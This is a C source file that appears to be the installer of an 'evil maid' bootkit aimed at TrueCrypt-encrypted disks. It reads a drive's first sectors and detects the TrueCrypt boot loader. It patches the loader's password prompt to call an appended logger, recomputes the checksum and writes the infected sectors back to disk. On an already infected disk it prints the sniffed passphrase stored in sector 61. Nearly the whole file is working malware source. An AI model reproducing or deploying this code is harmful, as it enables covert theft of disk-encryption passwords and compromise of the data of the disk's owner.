#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#include "patch_tc.h"

extern void* Logger;
extern unsigned short g_uLoggerCodeSize;
extern unsigned short g_uCallAskPasswordDeltaOffset;

typedef enum {FALSE = 0, TRUE} bool;


bool SaveSectors (
	void* Sectors,
	unsigned long uSize,
	const char* szBackupName
)
{
	int hDump;
	unsigned long nbWritten;

	if (!Sectors || !uSize || !szBackupName)
		return FALSE;

	hDump = open (szBackupName, O_CREAT | O_TRUNC | O_WRONLY, 0600);
	if (hDump < 0) {
		printf ("SaveSectors(): Failed to create a file %s, last error %d\n", szBackupName, errno);
		return FALSE;
	}

	nbWritten = write (hDump, Sectors, uSize);
	if (nbWritten != uSize) {
		printf ("SaveSectors(): Failed to write a backup file %s, last error %d\n", szBackupName, errno);
		close (hDump);
		unlink (szBackupName);
		return FALSE;
	}

	close (hDump);
	return TRUE;
}

unsigned long rotl32 (unsigned long x, const unsigned bits) {
	unsigned n = bits % 32;
	return (x << n) | (x >> (32-n));
}


unsigned long GetChecksum (
	const unsigned char *data,
	size_t size
)
{
	unsigned long sum = 0;

	while (size-- > 0) {
		sum += *data++;
		sum = rotl32 (sum, 1);
	}

	return sum;
}

bool PatchAskPassword (
	unsigned char* pDecompressedLoader,
	unsigned short LoaderMemorySize,
	unsigned char* * ppPatchedLoader,
	unsigned short *pPatchedLoaderMemorySize,
	bool * pbAlreadyInfected
)
{
	unsigned short i;
	unsigned short AskPasswordOffset;
	unsigned short CallDeltaOffset;
	bool bCallFound;
	unsigned char* pPatchedLoader;
	unsigned short PatchedLoaderMemorySize;

	if (!pDecompressedLoader || LoaderMemorySize < 6 || !ppPatchedLoader || !pPatchedLoaderMemorySize
	    || !pbAlreadyInfected)
		return FALSE;

	*ppPatchedLoader = NULL;
	*pPatchedLoaderMemorySize = 0;
	*pbAlreadyInfected = FALSE;

	// in boot loader:

	// 6A 22      push 22h             ; bootArguments->BootPassword
	// E8 XX XX   call AskPassword

	bCallFound = FALSE;

	for (i = 0; i < LoaderMemorySize - 6; i++) {
		if ((*(unsigned long*) & pDecompressedLoader[i] & 0xffffff) == 0xe8226a) {

			if (bCallFound)
				return FALSE;

			AskPasswordOffset =
				(unsigned short) ((unsigned short) (i + 5) + *(signed short *) &pDecompressedLoader[i + 3]);

			if (*(unsigned long*) & pDecompressedLoader[AskPasswordOffset] == *(unsigned long*) & Logger) {
				printf ("PatchAskPassword(): Loader is already infected\n");
				*pbAlreadyInfected = TRUE;
				return FALSE;
			}

			if (pDecompressedLoader[AskPasswordOffset] != 0xc8)
				// first subroutine instruction is not "enter"
				continue;

			CallDeltaOffset = i + 3;

			printf ("PatchAskPassword(): AskPassword() located at offset 0x%X\n", AskPasswordOffset);
			bCallFound = TRUE;
		}
	}

	if (!bCallFound)
		return FALSE;

	PatchedLoaderMemorySize = LoaderMemorySize + g_uLoggerCodeSize;
	pPatchedLoader = malloc (PatchedLoaderMemorySize);

	if (!pPatchedLoader)
		return FALSE;

	memset (pPatchedLoader, 0, PatchedLoaderMemorySize);
	memcpy (pPatchedLoader, pDecompressedLoader, LoaderMemorySize);
	memcpy (&pPatchedLoader[LoaderMemorySize], &Logger, g_uLoggerCodeSize);

	// patch "call AskPassword" to call our code at the end of the memory image

	*(signed short *) &pPatchedLoader[CallDeltaOffset] = (signed short) (LoaderMemorySize - (CallDeltaOffset + 2));
	*(signed short *) &pPatchedLoader[LoaderMemorySize + g_uCallAskPasswordDeltaOffset] =
		(signed short) (AskPasswordOffset - (LoaderMemorySize + g_uCallAskPasswordDeltaOffset + 2));

	*ppPatchedLoader = pPatchedLoader;
	*pPatchedLoaderMemorySize = PatchedLoaderMemorySize;

	return TRUE;
}

bool ReadFirstSectors (
	char *szDevice,
	unsigned long uSectorCount,
	char **ppFirstSectors,
	int * pDevice
)
{
	unsigned long uImageSize;
	char *pFirstSectors;
	int hDevice;
	unsigned long nbRead;
	unsigned long nbWrite;

	if (!szDevice || !pDevice || !uSectorCount || !ppFirstSectors)
		return FALSE;

	*pDevice = -1;
	*ppFirstSectors = NULL;

	hDevice = open (szDevice, O_RDWR);
	if (hDevice < 0) {
		printf ("ReadFirstSectors(): Failed to open %s, last error %d\n", szDevice, errno);
		return FALSE;
	}	

	uImageSize = uSectorCount * SECTOR_SIZE;

	pFirstSectors = malloc (uImageSize);
	if (!pFirstSectors) {
		printf ("ReadFirstSectors(): Failed to allocate %d bytes\n", uImageSize);
		close (hDevice);
		return FALSE;
	}
	memset (pFirstSectors, 0, uImageSize);

	nbRead = read (hDevice, pFirstSectors, uImageSize);
	if (nbRead != uImageSize) {
		printf
			("ReadFirstSectors(): Failed to read first %d sectors of the drive, last error %d\n",
			 uSectorCount, errno);
		free (pFirstSectors);
		close (hDevice);
		return FALSE;
	}

	
	*pDevice = hDevice;
	*ppFirstSectors = pFirstSectors;

	return TRUE;
}

// At least 64 sectors should be provided
bool IsTrueCrypt (
	const unsigned char *pFirstSectors,
	unsigned long uSectorsCount
)
{
	unsigned short uCompressedLoaderSize;
	unsigned long uChecksum;

	if (!pFirstSectors || uSectorsCount < 64)
		return FALSE;

	if (strncmp ((const char*)&pFirstSectors[6], "TrueCrypt Boot Loader", sizeof ("TrueCrypt Boot Loader") - 1))
		return FALSE;

	uCompressedLoaderSize = *(unsigned short*) & pFirstSectors[TC_BOOT_SECTOR_LOADER_LENGTH_OFFSET];
	if (uCompressedLoaderSize > (uSectorsCount - 5) * SECTOR_SIZE)
		return FALSE;

	uChecksum = GetChecksum (&pFirstSectors[SECTOR_SIZE], 4 * SECTOR_SIZE + uCompressedLoaderSize);
	if (*(unsigned long*) & pFirstSectors[TC_BOOT_SECTOR_LOADER_CHECKSUM_OFFSET] != uChecksum)
		return FALSE;

	return TRUE;
}

// At least 64 sectors should be provided
bool PatchTrueCrypt (
	unsigned char *pFirstSectors,
	unsigned long uSectorsCount,
	bool * pbAlreadyInfected
)
{
	unsigned long uImageSize;
	unsigned short uCompressedLoaderSize;
	unsigned short uLoaderMemorySize;
	unsigned short uPatchedLoaderMemorySize;
	unsigned long i;
	unsigned long uLoaderMemorySizeMBROffset;
	unsigned long uDecompressedLoaderSize;
	unsigned long uCompressedPatchedLoaderSize;
	unsigned long uChecksum;
	int hDecompressedLoader;
	int hCompressedPatchedLoader;
	unsigned char *pDecompressedLoader;
	unsigned char *pUncompressedPatchedLoader;
	unsigned long nbRead;

	struct stat FileStatStruct;

	if (!pFirstSectors || uSectorsCount < 64 || !pbAlreadyInfected)
		return FALSE;

	*pbAlreadyInfected = FALSE;
	uImageSize = uSectorsCount * SECTOR_SIZE;

	uCompressedLoaderSize = *(unsigned short*) & pFirstSectors[TC_BOOT_SECTOR_LOADER_LENGTH_OFFSET];
	printf ("PatchTrueCrypt(): Compressed loader size: %d bytes\n", uCompressedLoaderSize);

	// in MBR:

	// B9 FF XX   mov cx, 0xXXff  ; TC_BOOT_MEMORY_REQUIRED * 1024 - TC_COM_EXECUTABLE_OFFSET - 1
	// FC         cld
	// F3 AA      rep stosb

	uLoaderMemorySize = 0;
	for (i = 0; i < 512 - 6; i++) {
		if (*(unsigned short*) & pFirstSectors[i] == 0xffb9 && pFirstSectors[i + 3] == 0xfc
		    && *(unsigned short*) & pFirstSectors[i + 4] == 0xaaf3) {
			uLoaderMemorySize = *(unsigned short*) & pFirstSectors[i + 1] + TC_COM_EXECUTABLE_OFFSET + 1;
			uLoaderMemorySizeMBROffset = i + 1;
			printf ("PatchTrueCrypt(): Loader memory size: 0x%X (%d) bytes\n", uLoaderMemorySize, uLoaderMemorySize);
			break;
		}
	}

	if (!uLoaderMemorySize) {
		printf ("PatchTrueCrypt(): Failed to get the loader memory size\n");
		return FALSE;
	}

	if (!SaveSectors (&pFirstSectors[5 * SECTOR_SIZE], uCompressedLoaderSize, LOADER_COMPRESSED)) {
		printf ("PatchTrueCrypt(): SaveSectors() failed to backup first %d sectors of the drive\n", uSectorsCount);
		return FALSE;
	}

	unlink (LOADER);

	printf ("PatchTrueCrypt(): Decompressing the boot loader\n");

	if (WEXITSTATUS (system ("gzip -d -f " LOADER_COMPRESSED)) != 0) {
		printf ("PatchTrueCrypt(): Decompression failed\n");
		return FALSE;
	}

	printf ("PatchTrueCrypt(): Decompression successful\n");

	hDecompressedLoader = open (LOADER, O_RDONLY);
	if (hDecompressedLoader < 0) {
		printf ("PatchTrueCrypt(): Failed to open %s, last error %d\n", LOADER, errno);
		return FALSE;
	}

	if (fstat (hDecompressedLoader, &FileStatStruct) == -1) {
		printf ("PatchTrueCrypt(): Cannot stat file, error %d\n", errno);
		close (hDecompressedLoader);
		return FALSE;
	}
	uDecompressedLoaderSize = FileStatStruct.st_size;

	printf ("PatchTrueCrypt(): Decompressed loader physical size: %d bytes\n", uDecompressedLoaderSize);

	if (uDecompressedLoaderSize > uLoaderMemorySize) {
		printf ("PatchTrueCrypt(): Memory size taken from MBR contradicts the decompressed binary size\n");
		close (hDecompressedLoader);
		return FALSE;
	}

	pDecompressedLoader = malloc (uLoaderMemorySize);
	if (!pDecompressedLoader) {
		printf ("PatchTrueCrypt(): Failed to allocate memory for the decompressed loader\n");
		close (hDecompressedLoader);
		return FALSE;
	}
	memset (pDecompressedLoader, 0, uLoaderMemorySize);

	nbRead = read (hDecompressedLoader, pDecompressedLoader, uDecompressedLoaderSize);
	if (nbRead != uDecompressedLoaderSize) {
		printf
			("PatchTrueCrypt(): ReadFile() failed (last error %d) while reading the decompressed loader\n",
			 errno);
		free (pDecompressedLoader);
		close (hDecompressedLoader);
		return FALSE;
	}


	close (hDecompressedLoader);
	unlink (LOADER);

/*
	if (!SaveSectors (pDecompressedLoader, uLoaderMemorySize, "unc")) {
		return FALSE;
	}
*/

	pUncompressedPatchedLoader = NULL;
	uPatchedLoaderMemorySize = 0;
	if (!PatchAskPassword
	    (pDecompressedLoader, uLoaderMemorySize, &pUncompressedPatchedLoader, &uPatchedLoaderMemorySize,
		pbAlreadyInfected)) {
		printf ("PatchTrueCrypt(): PatchAskPassword() failed\n");
		free (pDecompressedLoader);
		return FALSE;
	}

	free (pDecompressedLoader);

	*(unsigned short*) & pFirstSectors[uLoaderMemorySizeMBROffset] =
		ALIGN (uPatchedLoaderMemorySize, 0x400) - 1 - TC_COM_EXECUTABLE_OFFSET;

	if (!SaveSectors (pUncompressedPatchedLoader, uPatchedLoaderMemorySize, PATCHED_LOADER)) {
		free (pUncompressedPatchedLoader);
		return FALSE;
	}

	free (pUncompressedPatchedLoader);

	unlink (PATCHED_LOADER_COMPRESSED);

	printf ("PatchTrueCrypt(): Compressing the patched loader\n");

	if (WEXITSTATUS(system("gzip -n --best -f " PATCHED_LOADER)) != 0) {
		printf ("PatchTrueCrypt(): Compression failed\n");
		return FALSE;
	}

	printf ("PatchTrueCrypt(): Compression successful\n");

	hCompressedPatchedLoader = open (PATCHED_LOADER_COMPRESSED, O_RDONLY);
	if (hCompressedPatchedLoader < 0) {
		printf ("PatchTrueCrypt(): Failed to open %s, last error %d\n", LOADER, errno);
		return FALSE;
	}

	if (fstat (hCompressedPatchedLoader, &FileStatStruct) == -1) {
		printf ("PatchTrueCrypt(): Cannot stat file, error %d\n", errno);
		close (hCompressedPatchedLoader);
		return FALSE;
	}
	uCompressedPatchedLoaderSize = FileStatStruct.st_size;


	printf ("PatchTrueCrypt(): Compressed patched loader size: %d bytes\n", uCompressedPatchedLoaderSize);

	nbRead = read (hCompressedPatchedLoader, &pFirstSectors[5 * SECTOR_SIZE], uCompressedPatchedLoaderSize);
	if (nbRead != uCompressedPatchedLoaderSize) {
		printf
			("PatchTrueCrypt(): ReadFile() failed (last error %d) while reading the compressed loader\n",
			 errno);
		close (hCompressedPatchedLoader);
		return FALSE;
	}

	
	close (hCompressedPatchedLoader);
	unlink (PATCHED_LOADER_COMPRESSED);

	uChecksum = GetChecksum (&pFirstSectors[SECTOR_SIZE], 4 * SECTOR_SIZE + uCompressedPatchedLoaderSize);
	printf ("PatchTrueCrypt(): New checksum: 0x%X\n", uChecksum);

	*(unsigned long*) & pFirstSectors[TC_BOOT_SECTOR_LOADER_CHECKSUM_OFFSET] = uChecksum;
	*(unsigned short*) & pFirstSectors[TC_BOOT_SECTOR_LOADER_LENGTH_OFFSET] = (short) uCompressedPatchedLoaderSize;

	return TRUE;
}

bool DisplayTrueCryptPassword (
	unsigned char *pFirstSectors,
	unsigned long uSectorsCount
)
{
	Password *pPassword;
	unsigned long i;

	if (!pFirstSectors || uSectorsCount < 64)
		return FALSE;

	// Sniffed password should be stored at disk offset 0x7a00 (sector #61).
	// Modify logger.asm if this is changed.

	pPassword = (Password *) & pFirstSectors[61 * SECTOR_SIZE];
	if (MIN_PASSWORD > pPassword->Length || pPassword->Length > MAX_PASSWORD) {
		printf ("DisplayTrueCryptPassword(): No password found in the disk image\n");
		return FALSE;
	}

	printf ("DisplayTrueCryptPassword(): Password is \"");
	for (i = 0; i < pPassword->Length; i++)
		printf ("%c", pPassword->Text[i]);
	printf ("\"\n");

	return TRUE;
}

int main (
	int argc,
	char* argv[]
)
{
	int hDevice;
	unsigned char* pFirstSectors;
	unsigned long nbWritten;
	bool bAlreadyInfected;

	printf (VER_STRING);

	if (argc != 2) {
		printf ("Usage: %s <target>\n", argv[0]);
		return 1;
	}

	if (!ReadFirstSectors (argv[1], SECTORS_TO_BACKUP, (char**)&pFirstSectors, &hDevice)) {
		return 2;
	}

	if (!IsTrueCrypt (pFirstSectors, SECTORS_TO_BACKUP)) {
		printf ("Not a TrueCrypt Boot Loader\n");
		free (pFirstSectors);
		close (hDevice);
		return 3;
	}

	printf ("TrueCrypt Boot Loader detected\n");

	if (!SaveSectors (pFirstSectors, SECTORS_TO_BACKUP * SECTOR_SIZE, "sectors_backup")) {
		printf ("SaveSectors() failed to backup first %d sectors of the drive\n", SECTORS_TO_BACKUP);
		free (pFirstSectors);
		close (hDevice);
		return 4;
	}

	bAlreadyInfected = FALSE;

	if (!PatchTrueCrypt (pFirstSectors, SECTORS_TO_BACKUP, &bAlreadyInfected)) {

		if (bAlreadyInfected) {
			DisplayTrueCryptPassword (pFirstSectors, SECTORS_TO_BACKUP);
			free (pFirstSectors);
			close (hDevice);
			return 0;
		} else {
			printf ("Failed to patch TrueCrypt image\n");
			free (pFirstSectors);
			close (hDevice);
			return 5;
		}
	}

	lseek (hDevice, 0, SEEK_SET);

	nbWritten = write (hDevice, pFirstSectors, SECTORS_TO_BACKUP * SECTOR_SIZE);
	if (nbWritten != SECTORS_TO_BACKUP * SECTOR_SIZE) {
		printf ("Failed to update the first sectors of a device, last error %d\n", errno);
		close (hDevice);
		//unlink (szBackupName);
		return FALSE;
	}

/*	if (!SaveSectors (pFirstSectors, SECTORS_TO_BACKUP * SECTOR_SIZE, "patched_image")) {
		printf ("SaveSectors() failed to backup first %d sectors of the drive\n", SECTORS_TO_BACKUP);
		free (pFirstSectors);
		close (hDevice);
		return;
	}
*/
	free (pFirstSectors);
	close (hDevice);
	return 0;

}
